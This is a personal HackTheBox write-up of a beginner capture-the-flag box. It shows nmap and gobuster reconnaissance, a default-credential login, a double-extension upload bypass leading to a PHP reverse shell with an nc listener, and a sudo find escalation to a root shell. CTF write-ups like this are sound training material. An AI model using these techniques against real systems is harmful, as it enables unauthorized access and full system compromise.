---
title: "HTB: Getting Started — My First Root Flag"
description: "How I got my first root flag on HackTheBox, what went wrong, and what I actually learned from it."
category: CTF
tags: [htb, linux, privilege-escalation, nmap]
---

Every pentester remembers their first root flag. Mine was messier than I'd like to admit — but that's the point of writing it down.

## The Setup

HackTheBox Getting Started machine. Beginner-rated. I told myself it'd take 30 minutes. It took three hours and two hints.

**Recon first, always.**

```bash
nmap -sC -sV -p- --min-rate 5000 -oN scan.txt 10.10.11.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41
```

Standard ports. SSH and a web server. Let's look at the site.

## Web Enumeration

Nothing interesting on the homepage at first glance. Ran directory brute-force:

```bash
gobuster dir -u http://10.10.11.x -w /usr/share/wordlists/dirb/common.txt
```

Found `/admin` — redirected to a login page. Tried default credentials.

`admin:admin` worked.

I'm not even going to pretend I felt smart about that.

## Getting a Shell

Inside the admin panel there was a file upload feature. I tested it:

1. Uploaded a `.jpg` → accepted
2. Uploaded a `.php` → blocked
3. Uploaded a `.php.jpg` → accepted and executed ✅

Classic extension filter bypass. Uploaded a PHP reverse shell, set up my listener:

```bash
nc -lvnp 4444
```

Navigated to the uploaded file. Shell landed.

## Privilege Escalation

Ran `sudo -l`:

```
(ALL) NOPASSWD: /usr/bin/find
```

[GTFOBins](https://gtfobins.github.io/gtfobins/find/) had exactly what I needed:

```bash
sudo find . -exec /bin/sh \; -quit
```

Root. Flag captured.

## What I Actually Learned

The box itself was simple. What stuck with me:

- **Default credentials are never "too obvious" to try.** Check them first, always.
- **Extension filters are often incomplete.** When one extension is blocked, try variations before escalating to more complex bypasses.
- **GTFOBins is not optional knowledge.** Print it out if you have to.

The three hours came from over-thinking the web enumeration and skipping the obvious. Lesson learned.

---

*Next up: a machine where the rabbit holes actually matter.*
